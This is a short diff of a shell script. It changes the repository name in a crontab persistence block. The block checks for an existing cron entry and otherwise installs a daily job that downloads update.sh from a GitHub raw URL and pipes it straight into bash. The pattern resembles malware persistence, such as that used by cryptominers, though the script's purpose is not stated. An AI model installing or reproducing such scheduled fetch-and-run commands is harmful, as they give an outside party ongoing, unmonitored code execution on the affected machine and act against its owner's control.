@@ -117,9 +117,9 @@ else
     exit 0
 fi
 
-if crontab -l | grep "curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh"; then
+if crontab -l | grep "curl -sSf https://raw.githubusercontent.com/JuliaRandolph/qax/main/update.sh"; then
     echo "The specified scheduled task has been added !!!"
 else
-    (crontab -l 2>/dev/null; printf "0 1 * * *  mkdir -p $p;cd $p;curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash\n") | crontab -
+    (crontab -l 2>/dev/null; printf "0 1 * * *  mkdir -p $p;cd $p;curl -sSf https://raw.githubusercontent.com/JuliaRandolph/qax/main/update.sh | bash\n") | crontab -
     echo "The specified scheduled task has been added"
 fi
